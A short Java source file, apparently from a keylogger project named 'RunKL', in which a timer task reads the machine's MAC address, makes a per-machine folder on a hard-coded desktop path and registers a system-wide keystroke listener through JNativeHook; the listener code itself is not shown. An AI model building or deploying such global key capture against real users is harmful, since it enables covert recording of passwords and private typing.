/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package jnativehookexample;

import java.io.File;
import java.util.TimerTask;
import org.jnativehook.GlobalScreen;

/**
 *
 * @author PanTomek
 */
public class RunKL extends TimerTask{

    @Override
    public void run() {
        MACaddress mac=new MACaddress();
        String s = mac.getmac();
        File dir = new File("C:\\Users\\PanTomek\\Desktop\\ThisOneFile\\" + s);
        dir.mkdir();
        KeyListener keyListener = new KeyListener();
        GlobalScreen.addNativeKeyListener(keyListener);
        //keyListener.setPath();
    }
    
}
